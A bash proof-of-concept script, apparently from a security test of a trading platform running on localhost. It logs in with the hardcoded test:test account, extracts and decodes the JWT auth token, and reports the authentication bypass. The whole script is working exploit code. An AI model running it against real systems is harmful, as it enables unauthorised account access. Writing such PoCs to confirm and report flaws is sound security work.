#!/bin/bash

# POC: Default Credentials Authentication Bypass
# Target: Trading Platform Login
# Vulnerability: Hardcoded test account (test:test) allows complete authentication bypass

TARGET_URL="http://localhost:8080"
USERNAME="test"
PASSWORD="test"
USER_ID="10032"

echo "[*] Testing Default Credentials Authentication Bypass"
echo "[*] Target: $TARGET_URL"
echo "[*] Attempting login with test:test credentials..."
echo ""

# Attempt to login using the default credentials
RESPONSE=$(curl -s -i -X POST \
  -d "username=$USERNAME&user_id=$USER_ID&password=$PASSWORD" \
  "$TARGET_URL/password/$USERNAME" 2>&1)

echo "[+] Response received:"
echo "$RESPONSE"
echo ""

# Extract HTTP status code
HTTP_CODE=$(echo "$RESPONSE" | head -n 1 | awk '{print $2}')
echo "[*] HTTP Status Code: $HTTP_CODE"

# Extract auth token from Set-Cookie header
AUTH_TOKEN=$(echo "$RESPONSE" | grep -i "Set-Cookie:" | grep "auth_token" | sed 's/.*auth_token=\([^;]*\).*/\1/')

if [ -n "$AUTH_TOKEN" ]; then
    echo "[+] Authentication Successful!"
    echo "[+] Auth Token Retrieved: $AUTH_TOKEN"
    echo ""
    
    # Decode JWT (base64 decode the payload)
    PAYLOAD=$(echo "$AUTH_TOKEN" | cut -d '.' -f 2)
    # Add padding if needed
    PADDING=$((${#PAYLOAD} % 4))
    if [ $PADDING -eq 2 ]; then
        PAYLOAD="$PAYLOAD=="
    elif [ $PADDING -eq 3 ]; then
        PAYLOAD="$PAYLOAD="
    fi
    
    DECODED=$(echo "$PAYLOAD" | base64 -d 2>/dev/null)
    echo "[+] JWT Payload Decoded:"
    echo "$DECODED"
    echo ""
    
    # Check if redirect to dashboard occurred
    if echo "$RESPONSE" | grep -q "302\|Location.*dashboard"; then
        echo "[+] VULNERABILITY CONFIRMED: Default credentials allow authentication bypass"
        echo "[+] Application redirects to dashboard after successful login"
        echo "[+] Impact: Complete authentication bypass with valid JWT token"
        exit 0
    fi
elif echo "$RESPONSE" | grep -q "302\|Location"; then
    echo "[+] HTTP 302 Redirect detected - likely successful authentication"
    echo "[+] VULNERABILITY CONFIRMED: Default credentials allow authentication bypass"
    exit 0
else
    echo "[-] Authentication failed or unexpected response"
    exit 1
fi